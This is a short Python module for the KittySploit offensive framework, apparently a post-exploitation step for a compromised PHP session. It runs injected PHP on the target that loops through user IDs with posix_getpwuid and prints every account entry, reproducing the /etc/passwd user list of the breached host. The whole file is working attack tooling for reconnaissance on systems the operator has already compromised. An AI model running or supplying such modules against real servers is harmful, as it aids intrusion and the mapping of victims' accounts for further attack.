from kittysploit import *
from core.framework.failure import ProcedureError, FailureType

class Module(Post):

	__info__ = {
		"name": "List all users from /etc/passwd",
		"description": "List all users from /etc/passwd",
		"author": "KittySploit Team",
		"arch": Arch.PHP,
		"tags": ["php"],
		"session_type": SessionType.PHP,
	}	
		
	def run(self):
		try:
			result = self.cmd_execute("""
if(is_callable('posix_getpwuid')) 
{ 
	for($n=0; $n<2000;$n++) 
	{ 
		$uid = @posix_getpwuid($n); 
		if ($uid) 
			echo join(':',$uid).PHP_EOL; 
	}
}
""")
			if result:
				print_info(result)
				return True
			else:
				raise ProcedureError(FailureType.NotAccess, "No user information found or posix_getpwuid not available")
		except ProcedureError:
			# Re-raise ProcedureError as-is
			raise
		except Exception as e:
			raise ProcedureError(FailureType.Unknown, f"Error executing PHP code: {e}")
